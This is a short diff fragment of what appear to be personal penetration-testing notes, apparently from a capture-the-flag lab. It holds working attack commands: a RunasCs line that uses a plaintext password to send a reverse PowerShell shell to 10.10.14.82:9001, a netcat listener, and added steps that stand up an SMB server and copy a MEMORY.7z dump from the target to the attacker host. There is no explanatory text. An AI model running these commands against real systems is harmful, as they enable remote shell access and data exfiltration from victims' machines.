@@ -75,3 +75,13 @@ runascs.exe mikasaAckerman 'IL0v3ErenY3ager' powershell.exe -r 10.10.14.82:9001
 host:
 rlwrap -cAr nc -nvlp 9001
 ==========(10)======================================================================================================================
+host:
+smbserver.py share . -username test -password t3st -smb2support
+md5sum Memory.7z
+
+target:
+net use \\10.10.14.82\share /user:test t3st
+copy MEMORY.7z \\10.10.14.82\share\
+get-filehash -algorithm md5 MEMORY.7z
+
+
